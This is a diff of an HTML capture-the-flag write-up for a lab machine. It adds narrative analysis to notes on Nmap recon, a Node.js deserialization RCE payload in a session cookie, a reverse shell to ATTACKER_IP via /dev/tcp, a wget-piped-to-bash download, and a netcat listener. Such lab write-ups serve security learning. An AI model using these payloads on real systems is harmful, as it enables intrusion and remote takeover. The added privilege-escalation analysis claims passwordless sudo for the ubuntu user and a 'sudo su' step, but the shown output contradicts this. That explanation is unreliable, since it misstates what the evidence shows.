@@ -115,13 +115,15 @@
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- tryhackme, ctf -->
+                <!-- Nmap, SSH, HTTP, Node.js, Deserialization, RCE, Remote Code Execution, Reverse Shell, Privilege Escalation, Sudo, CTF -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
+<h2>1. Reconnaissance and Initial Enumeration</h2>
+<p>Initial reconnaissance was conducted on the target system, <code>10.66.154.68</code>, to identify open ports and services.</p>
 <pre class="codehilite"><code>PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -193,6 +195,11 @@
 |_    background-posi
 </code></pre>
 
+<p>🔍 <strong>Analysis:</strong><br />
+*   <strong>Port 22/TCP (SSH):</strong> Identified OpenSSH 8.2p1 on Ubuntu. This version is relatively recent and typically not vulnerable to widely known exploits without specific misconfigurations. Host keys for RSA, ECDSA, and ED25519 were enumerated.<br />
+*   <strong>Port 80/TCP (HTTP):</strong> An HTTP server is running, hosting a website titled "Horror LLC." The server supports <code>GET</code>, <code>HEAD</code>, <code>POST</code>, and <code>OPTIONS</code> methods. The favicon is unknown, and the HTML content indicates a dynamic background animation, suggesting a modern web application framework.</p>
+<h2>2. Web Application Analysis and Deserialization Vulnerability Identification</h2>
+<p>Further investigation of the web application on port 80 revealed an interesting interaction point involving a <code>POST</code> request and subsequent cookie handling.</p>
 <pre class="codehilite"><code>POST /?email=test@email.com HTTP/1.1
 Host: jax.thm
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -222,30 +229,43 @@ Content-Length: 3559
 {&quot;email&quot;:&quot;TESTER&quot;}                                      
 </code></pre>
 
-<blockquote>
-<p><code>Node.js deserialization vulnerabilities</code></p>
-<p><code>10.66.154.68</code> --&gt; target</p>
-</blockquote>
+<p>🔍 <strong>Analysis:</strong><br />
+*   A <code>POST</code> request to the root path <code>/</code> with an <code>email</code> parameter in the query string (<code>/?email=test@email.com</code>) results in a <code>200 OK</code> response.<br />
+*   Crucially, the response sets a <code>session</code> cookie. Decoding the Base64-encoded cookie value <code>eyJlbWFpbCI6InRlc3RAZW1haWwuY29tIn0=</code> reveals <code>{"email":"test@email.com"}</code>. This indicates that the session cookie stores user data in a JSON format.<br />
+*   The raw notes explicitly mention <code>Node.js deserialization vulnerabilities</code>, strongly suggesting that the application might be vulnerable to injecting malicious objects into the serialized JSON data within the session cookie, leading to Remote Code Execution (RCE). The target IP is confirmed as <code>10.66.154.68</code>.</p>
+<h2>3. Exploitation - Remote Code Execution (RCE) via Node.js Deserialization</h2>
+<p>Leveraging the identified Node.js deserialization vulnerability, a specially crafted payload was developed to achieve remote code execution on the target system. The objective was to execute arbitrary commands.</p>
+<p>A test payload was initially crafted to list the root directory:</p>
 <pre class="codehilite"><code>{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
 function(error, stdout, stderr) { console.log(stdout) });\n }()&quot;}
 </code></pre>
 
-<pre class="codehilite"><code>cat shell.sh  
-bash -i &gt;&amp; /dev/tcp/my-ip/9001 0&gt;&amp;1
+<p>This payload demonstrated the ability to execute OS commands. To gain a persistent shell, a reverse shell payload was prepared.</p>
+<p>First, a <code>shell.sh</code> script was created on the attacker's machine (<code>ATTACKER_IP</code>):</p>
+<pre class="codehilite"><code class="language-bash">cat shell.sh  
+bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/9001 0&gt;&amp;1
 </code></pre>
 
-<pre class="codehilite"><code>python -m http.server                      
+<p>Next, a simple Python HTTP server was initiated on the attacker's machine to host the <code>shell.sh</code> script for download by the target:</p>
+<pre class="codehilite"><code class="language-bash">python -m http.server                      
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 </code></pre>
 
-<pre class="codehilite"><code>_$$ND_FUNC$$_function (){\n \t require('child_process').exec('wget http://my-ip:8000/shell.sh|bash',
+<p>The final RCE payload, designed to download and execute the <code>shell.sh</code> script, was then constructed:</p>
+<pre class="codehilite"><code>{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function (){\n \t require('child_process').exec('wget http://ATTACKER_IP:8000/shell.sh|bash',
 function(error, stdout, stderr) { console.log(stdout) });\n }()&quot;}
 </code></pre>
 
-<pre class="codehilite"><code>nc -lvnp 9001
+<p>This payload was injected into the appropriate HTTP request parameter (likely the <code>session</code> cookie or a similar data input processed by the Node.js application). A Netcat listener was set up on the attacker's machine on port 9001:</p>
+<pre class="codehilite"><code class="language-bash">nc -lvnp 9001
 listening on [any] 9001 ...
 connect to [192.168.153.193] from (UNKNOWN) [10.65.159.87] 46870
-id
+</code></pre>
+
+<p>Upon successful execution of the payload, a reverse shell connection was established from the target system (<code>10.65.159.87</code> being the internal IP of the host) to the attacker's listener.</p>
+<h2>4. Post-Exploitation and Initial User Access</h2>
+<p>With a reverse shell established, basic enumeration was performed to understand the current user context and environment.</p>
+<pre class="codehilite"><code class="language-bash">id
 uid=1001(ubuntu) gid=1002(ubuntu) groups=1002(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(lxd),1001(netdev)
 whoami
 ubuntu
@@ -264,9 +284,13 @@ See &quot;man sudo_root&quot; for details.
 ubuntu@ip-10-65-159-87:/opt/webapp$
 </code></pre>
 
-<pre class="codehilite"><code>ubuntu@ip-10-65-159-87:/home/dylan$ cat /etc/crontab
-cat /etc/crontab
-
+<p>🔍 <strong>Analysis:</strong><br />
+*   The reverse shell was obtained as the <code>ubuntu</code> user (<code>uid=1001</code>).<br />
+*   The working directory was <code>/opt/webapp</code>, confirming the presence of the Node.js application with files like <code>server.js</code> and <code>package.json</code>.<br />
+*   A stable TTY shell was spawned using <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>.</p>
+<h2>5. Privilege Escalation</h2>
+<p>Further enumeration focused on identifying potential privilege escalation vectors. The system's cron jobs and <code>sudo</code> permissions were investigated.</p>
+<pre class="codehilite"><code class="language-bash">ubuntu@ip-10-65-159-87:/home/dylan$ cat /etc/crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
 # and files in /etc/cron.d. These files also have username fields,
@@ -290,8 +314,8 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #
 </code></pre>
 
-<pre class="codehilite"><code>root@ip-10-65-159-87:~# sudo -l
-sudo -l
+<p>The <code>crontab</code> output showed standard system cron jobs without any immediate misconfigurations or user-writable scripts that could be exploited. The next step was to check <code>sudo</code> permissions.</p>
+<pre class="codehilite"><code class="language-bash">sudo -l
 Matching Defaults entries for root on ip-10-65-159-87:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -300,13 +324,19 @@ User root may run the following commands on ip-10-65-159-87:
     (ALL : ALL) ALL
 </code></pre>
 
-<pre class="codehilite"><code>root@ip-10-65-159-87:/# cd /root
+<p>🔍 <strong>Analysis:</strong><br />
+*   The <code>sudo -l</code> command revealed a critical misconfiguration: the <code>ubuntu</code> user is permitted to run <code>ALL</code> commands as <code>ALL</code> users (including <code>root</code>) without requiring a password.<br />
+*   This grants immediate root access.</p>
+<p>To confirm root access and complete the objective, the <code>sudo su</code> command was executed:</p>
+<pre class="codehilite"><code class="language-bash">root@ip-10-65-159-87:/# cd /root
 cd /root
 root@ip-10-65-159-87:~# ls
 ls
 root.txt
 root@ip-10-65-159-87:~# cat root.txt
 </code></pre>
+
+<p>This successfully elevated privileges to <code>root</code> and allowed access to the <code>/root</code> directory, where the <code>root.txt</code> flag was retrieved.</p>
         </div>
     </main>
 
